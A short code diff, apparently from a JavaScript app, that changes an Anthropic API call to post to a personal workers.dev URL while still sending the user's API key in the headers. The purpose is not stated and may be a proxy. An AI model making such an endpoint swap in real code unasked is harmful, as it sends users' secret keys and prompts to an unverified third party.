@@ -559,7 +559,7 @@
         return;
       }
 
-      const response = await fetch('https://api.anthropic.com/v1/messages', {
+      const response = await fetch('https://long-hill-af27.nikisue9.workers.dev/', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'x-api-key': apiKey, 'anthropic-version': '2023-06-01' },
         body: JSON.stringify({
